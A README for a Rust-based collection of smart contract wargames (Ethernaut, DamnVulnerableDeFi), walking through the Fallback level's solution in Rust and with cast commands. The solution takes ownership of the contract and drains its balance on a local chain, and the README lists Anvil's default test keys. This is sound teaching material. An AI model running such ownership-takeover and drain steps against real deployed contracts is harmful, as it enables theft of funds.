# DEX OFFENDER

A compilation of smart contract wargames (currently only Ethernaut and DamnVulnerableDeFi). You can find the levels in `./contracts/$GAME_NAME` and add your solution to `./solutions/src/$GAME_NAME/lvl*.rs`. All tests are currently ignored so simply unignore them and then run `ctfcheck` (you can see exactly what that does under the hood in `flake.nix`).

## Deploying your own contracts

To start, simply add a smart contract to the `./contracts` either right into the file with the challenge or in a new file in the same folder. So it can be as simple as adding your contract right after the challenge.

``` solidity
contract Challenge {/* vulnerabilities are here */}

contract Exploit {/* your trolling goes here */}
```

You can then build the contract and generate Rust bindings for it by running `ctfbind`. For example, here's the solution of the first Ethernaut level, Fallback, in Rust. You can find the source code of the contract in `./contracts/ethernaut/lvl1/Fallback.sol`.

``` rust
use async_trait::async_trait; // <-- we need this for one line, don't worry bout it

use ethers::prelude::*; // <----- this is the library that lets us interact
//                                          with Ethereum in a convenient way

use bindings::fallback::Fallback; // Rust bindings for the smart contract for the level

use ctf::*; /// <---- This is the part of the code that is responsible for
//                                    deploying challenges and checking solutions

struct Solution; // <-- Create an empty struct representing a level so
//                           that you have something to implement the Solution trait for

#[async_trait]
impl Solution for Solution {
    type Level = Level1; // If you press ctrl+] then VS Code will take you to the
//                                   definition of this type so you can check what you can
//                                   use to pass the level. Usually it's just the address
//                                   to which the target contract was deployed

    async fn solve(
        self,
        challenge: &Self::Level, // this that same type you see in the `type Level` thing
        offender: Actor, // <-- that's you. of course don't use the `deployer` account
    ) -> eyre::Result<()> {
        // This is how you "connect" to a deployed contract. You can see how it was deployed
        // in ./ctf/src/ethernaut/lvl1_fallback.rs
        let contract =
            Fallback::new(challenge.contract_address, offender.clone());

        // This is how you call a contract function with no arguments:
        contract.contribute().value(1).send().await?.await?;

        // And this is how to send a regular transaction:
        offender
            .send_transaction(
                TransactionRequest::new().to(contract.address()).value(1),
                None,
            )
            .await?
            .await?;

        // And now withdraw. Easy money...
        contract.withdraw().send().await?.await?;

        Ok(())
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    // #[ignore] <------ comment out the ignore macro for the test to run
    #[tokio::test]
    async fn test() -> eyre::Result<()> {
        ctf::check_solution(Solution).await
    }
}
```

If you then run `ctfcheck` you should see something like this

``` sh
$ ctfcheck
[⠊] Compiling...
[⠒] Installing solc version 0.8.20
[⠢] Successfully installed solc 0.8.20
No files changed, compilation skipped
[⠊] Compiling...
[⠢] Installing solc version 0.8.20
[⠰] Successfully installed solc 0.8.20
No files changed, compilation skipped
Generating bindings for 19 contracts
Bindings have been output to ./bindings
   Compiling bindings v0.1.0 (/home/gleb/code/0xgleb/data-cartel/dex-offender/bindings)
   Compiling ctf v0.1.0 (/home/gleb/code/0xgleb/data-cartel/dex-offender/ctf)
   Compiling solutions v0.1.0 (/home/gleb/code/0xgleb/data-cartel/dex-offender/solutions)
    Finished test [unoptimized + debuginfo] target(s) in 6.83s
     Running unittests src/lib.rs (target/debug/deps/solutions-2b00d561556c247a)

running 4 tests
test ethernaut::lvl3_coin_flip::tests::test ... ignored
test ethernaut::lvl4_telephone::tests::test ... ignored
test ethernaut::lvl6_delegate::tests::test ... ignored


Ethernaut
    Level 1: Fallback

    Look carefully at the contract's code below.

    You will beat this challenge if
    1. you claim ownership of the contract
    2. you reduce its balance to 0

    Things that might help:
    - How to send ether when interacting with an ABI
    - How to send ether outside of the ABI
    - Converting to and from wei/ether units (see help() command)
    - Fallback methods

Initializing accounts...
Setting up the challenge...
Deploying the Fallback contract...
Running the solution...
Checking the solution...
Checking that you claimed ownership of the contract...
Checking that you reduced its balance to 0...

~~ $$ !! CONGRATULATIONS !! $$ ~~

Y O U P A S S E D T H E L E V E L

##################################

test ethernaut::lvl1_fallback::tests::test ... ok

test result: ok. 1 passed; 0 failed; 3 ignored; 0 measured; 0 filtered out; finished in 35.05s

   Doc-tests solutions

running 0 tests

test result: ok. 0 passed; 0 failed; 0 ignored; 0 measured; 0 filtered out; finished in 0.00s
```

## Local blockchain - Anvil

If you're using the dev container then you already have a local blockchain running in one of the VS code terminals. If not, you can start it by running

``` sh
anvil --steps-tracing --load-state state.json
```

`--steps-tracing` turns on tracing in the build-in Geth client. This is useful for debugging. `--load-state` loads the state from the file specified. `state.json` contains the state of the blockchain with all the levels set up.

| Field             | Value                                                       |
| ----------------- | ----------------------------------------------------------- |
| Port              | 8545                                                        |
| Mnemonic:         | test test test test test test test test test test test junk |
| Derivation path   | m/44'/60'/0'/0/                                             |
| Base Fee          | 1000000000                                                  |
| Gas Limit         | 30000000                                                    |
| Genesis Timestamp | 1686684032                                                  |

| Role      | Address                                    | Private key                                                        |
| --------- | ------------------------------------------ | ------------------------------------------------------------------ |
| Offender  | 0xa0Ee7A142d267C1f36714E4a8F75612F20a79720 | 0x2a871d0798f97d79848a013d4936a73bf4cc922c825d33c1cf7073dff6d409c6 |
| Deployer  | 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266 | 0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80 |
| Some user | 0x70997970C51812dc3A010C7d01b50e0d17dc79C8 | 0x59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690d |

## Command line wallet - Cast

You can then use `cast` to inspect blocks, transactions, send transactions, call smart contracts and more. Let's do Ethernaut level 1 again but now using `cast`. I deployed the `Fallback` contract behind the scenes to address `0x5FbDB2315678afecb367f032d93F642f64180aa3`. Let's call `contribute()` on the contract the same way we did in Rust. `-i` enables interactive mode and we can simply copy-paste the offender's private key to sign the transaction.

``` sh
$ cast send -i 0x5FbDB2315678afecb367f032d93F642f64180aa3 'contribute()' --value 0.0001ether
Enter private key: # <---------- ################# PASTE PRIVATE KEY HERE ############

blockHash               0xcf356e520eb871b84d65c40970094ba8e8a9b975264b3701d31367063e456b21
blockNumber             3
contractAddress
cumulativeGasUsed       47992
effectiveGasPrice       3767701843
gasUsed                 47992
logs                    []
logsBloom               0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
root
status                  1
transactionHash         0x35808bd72ddfc8f3a60da5ced50c8f8dfc62d3cd928b47121422fd02f025362e
transactionIndex        0
type                    2
```

Now let's send a regular ether transfer to that contract to trigger `receive()`.

```sh
$ cast send -i 0x5FbDB2315678afecb367f032d93F642f64180aa3 --value 0.0001ether
Enter private key:

blockHash               0x8fc732547f8d5357356aa593adac7294a4528cb7475c00744976e56a76374232
blockNumber             4
contractAddress
cumulativeGasUsed       28323
effectiveGasPrice       3672046143
gasUsed                 28323
logs                    []
logsBloom               0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
root
status                  1
transactionHash         0x7305a525824b6960eca3b105c2d90d561e0bc0b1e1bd77b88277ac4127876993
transactionIndex        0
type                    2
```

Let's check our contributions.

``` sh
$ cast call -i 0x5FbDB2315678afecb367f032d93F642f64180aa3 'getContribution()'
Enter private key:
0x00000000000000000000000000000000000000000000000000005af3107a4000
```

Decimal numbers look kinda weird in hex. Let's check who the owner is.

``` sh
$ cast call 0x5FbDB2315678afecb367f032d93F642f64180aa3 'owner()'
0x000000000000000000000000a0ee7a142d267c1f36714e4a8f75612f20a79720
```

Oh, that's the offender address. Looks like we should be able to `withdraw()` now.

```sh
$ cast send -i 0x5FbDB2315678afecb367f032d93F642f64180aa3 'withdraw()'
Enter private key:

blockHash               0x4f3bac2bc4f4f72cf8d231a9f660c4fe9c98c702fafba6f31bc35f7bd1c3108d
blockNumber             5
contractAddress
cumulativeGasUsed       30341
effectiveGasPrice       3588198995
gasUsed                 30341
logs                    []
logsBloom               0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
root
status                  1
transactionHash         0x6d2ec4f84ff1308695afd6a0ef130af5bde3f26eefc112b22d39840502528635
transactionIndex        0
type                    2
```

We can check that transaction.

```sh
$ cast tx 0x6d2ec4f84ff1308695afd6a0ef130af5bde3f26eefc112b22d39840502528635

blockHash            0x4f3bac2bc4f4f72cf8d231a9f660c4fe9c98c702fafba6f31bc35f7bd1c3108d
blockNumber          5
from                 0xa0Ee7A142d267C1f36714E4a8F75612F20a79720
gas                  32596
gasPrice             3588198995
hash                 0x6d2ec4f84ff1308695afd6a0ef130af5bde3f26eefc112b22d39840502528635
input                0x3ccfd60b
nonce                2
r                    0x3d6ef6c97099eac4ea34e4c4fd96b6a74178cb869d594204d230b71c013778cd
s                    0x12cb05396e67639be6d27f420e058a5d5e3595840da33dfa6dba3ba955342cc9
to                   0x5FbDB2315678afecb367f032d93F642f64180aa3
transactionIndex     0
v                    1
value                0
```

Or check its receipt.

```sh
$ cast receipt 0x6d2ec4f84ff1308695afd6a0ef130af5bde3f26eefc112b22d39840502528635

blockHash               0x4f3bac2bc4f4f72cf8d231a9f660c4fe9c98c702fafba6f31bc35f7bd1c3108d
blockNumber             5
contractAddress
cumulativeGasUsed       30341
effectiveGasPrice       3588198995
gasUsed                 30341
logs                    []
logsBloom               0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
root
status                  1
transactionHash         0x6d2ec4f84ff1308695afd6a0ef130af5bde3f26eefc112b22d39840502528635
transactionIndex        0
type                    2
```

With `cast rpc` you get the full power of Ethereum's JSON RPC API right at your fingertips.

```sh
$ cast rpc trace_transaction 0x6d2ec4f84ff1308695afd6a0ef130af5bde3f26eefc112b22d39840502528635
[{"action":{"from":"0xa0ee7a142d267c1f36714e4a8f75612f20a79720","to":"0x5fbdb2315678afecb367f032d93f642f64180aa3","value":"0x0","gas":"0x243d","input":"0x3ccfd60b","callType":"call"},"result":{"gasUsed":"0x243d","output":"0x"},"traceAddress":[],"subtraces":1,"transactionPosition":0,"transactionHash":"0x6d2ec4f84ff1308695afd6a0ef130af5bde3f26eefc112b22d39840502528635","blockNumber":5,"blockHash":"0x4f3bac2bc4f4f72cf8d231a9f660c4fe9c98c702fafba6f31bc35f7bd1c3108d","type":"call"},{"action":{"from":"0x5fbdb2315678afecb367f032d93f642f64180aa3","to":"0xa0ee7a142d267c1f36714e4a8f75612f20a79720","value":"0x4564476865e88000","gas":"0x0","input":"0x","callType":"call"},"result":{"gasUsed":"0x0","output":"0x"},"traceAddress":[0],"subtraces":0,"transactionPosition":0,"transactionHash":"0x6d2ec4f84ff1308695afd6a0ef130af5bde3f26eefc112b22d39840502528635","blockNumber":5,"blockHash":"0x4f3bac2bc4f4f72cf8d231a9f660c4fe9c98c702fafba6f31bc35f7bd1c3108d","type":"call"}]
```

This is hard to read. Let's pipe it thorugh `jq`.

``` sh
$ cast rpc trace_transaction 0x6d2ec4f84ff1308695afd6a0ef130af5bde3f26eefc112b22d39840502528635 | jq .
[
  {
    "action": {
      "from": "0xa0ee7a142d267c1f36714e4a8f75612f20a79720",
      "to": "0x5fbdb2315678afecb367f032d93f642f64180aa3",
      "value": "0x0",
      "gas": "0x243d",
      "input": "0x3ccfd60b",
      "callType": "call"
    },
    "result": {
      "gasUsed": "0x243d",
      "output": "0x"
    },
    "traceAddress": [],
    "subtraces": 1,
    "transactionPosition": 0,
    "transactionHash": "0x6d2ec4f84ff1308695afd6a0ef130af5bde3f26eefc112b22d39840502528635",
    "blockNumber": 5,
    "blockHash": "0x4f3bac2bc4f4f72cf8d231a9f660c4fe9c98c702fafba6f31bc35f7bd1c3108d",
    "type": "call"
  },
  {
    "action": {
      "from": "0x5fbdb2315678afecb367f032d93f642f64180aa3",
      "to": "0xa0ee7a142d267c1f36714e4a8f75612f20a79720",
      "value": "0x4564476865e88000",
      "gas": "0x0",
      "input": "0x",
      "callType": "call"
    },
    "result": {
      "gasUsed": "0x0",
      "output": "0x"
    },
    "traceAddress": [
      0
    ],
    "subtraces": 0,
    "transactionPosition": 0,
    "transactionHash": "0x6d2ec4f84ff1308695afd6a0ef130af5bde3f26eefc112b22d39840502528635",
    "blockNumber": 5,
    "blockHash": "0x4f3bac2bc4f4f72cf8d231a9f660c4fe9c98c702fafba6f31bc35f7bd1c3108d",
    "type": "call"
  }
]
```

Aight, last two. You can check the latest block easily.

``` sh
$ cast block latest

baseFeePerGas        588198995
difficulty           0
extraData            0x
gasLimit             30000000
gasUsed              30341
hash                 0x4f3bac2bc4f4f72cf8d231a9f660c4fe9c98c702fafba6f31bc35f7bd1c3108d
logsBloom            0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
miner                0x0000000000000000000000000000000000000000
mixHash              0x0000000000000000000000000000000000000000000000000000000000000000
nonce                0x0000000000000000
number               5
parentHash           0x8fc732547f8d5357356aa593adac7294a4528cb7475c00744976e56a76374232
receiptsRoot         0x24e5537e1fd854ea16e6273cfa8aa012a00ae87821ad88d8e06b6af7dbbedccb
sealFields           [
	0x0000000000000000000000000000000000000000000000000000000000000000
	0x0000000000000000
]
sha3Uncles           0x1dcc4de8dec75d7aab85b567b6ccd41ad312451b948a7413f0a142fd40d49347
size                 635
stateRoot            0xc1c5f00d1950c99bf08e0a8cd4ad30db017f95b4b980a1bba75b1fe8177602ab
timestamp            1687538356
totalDifficulty      0
transactions:        [
	0x6d2ec4f84ff1308695afd6a0ef130af5bde3f26eefc112b22d39840502528635
]
```

And we can trace blocks too (assuming you're running `anvil` with `--steps-tracing`).

```sh
$ cast rpc trace_block latest | jq .
[
  {
    "action": {
      "from": "0xa0ee7a142d267c1f36714e4a8f75612f20a79720",
      "to": "0x5fbdb2315678afecb367f032d93f642f64180aa3",
      "value": "0x0",
      "gas": "0x243d",
      "input": "0x3ccfd60b",
      "callType": "call"
    },
    "result": {
      "gasUsed": "0x243d",
      "output": "0x"
    },
    "traceAddress": [],
    "subtraces": 1,
    "transactionPosition": 0,
    "transactionHash": "0x6d2ec4f84ff1308695afd6a0ef130af5bde3f26eefc112b22d39840502528635",
    "blockNumber": 5,
    "blockHash": "0x4f3bac2bc4f4f72cf8d231a9f660c4fe9c98c702fafba6f31bc35f7bd1c3108d",
    "type": "call"
  },
  {
    "action": {
      "from": "0x5fbdb2315678afecb367f032d93f642f64180aa3",
      "to": "0xa0ee7a142d267c1f36714e4a8f75612f20a79720",
      "value": "0x4564476865e88000",
      "gas": "0x0",
      "input": "0x",
      "callType": "call"
    },
    "result": {
      "gasUsed": "0x0",
      "output": "0x"
    },
    "traceAddress": [
      0
    ],
    "subtraces": 0,
    "transactionPosition": 0,
    "transactionHash": "0x6d2ec4f84ff1308695afd6a0ef130af5bde3f26eefc112b22d39840502528635",
    "blockNumber": 5,
    "blockHash": "0x4f3bac2bc4f4f72cf8d231a9f660c4fe9c98c702fafba6f31bc35f7bd1c3108d",
    "type": "call"
  }
]
```
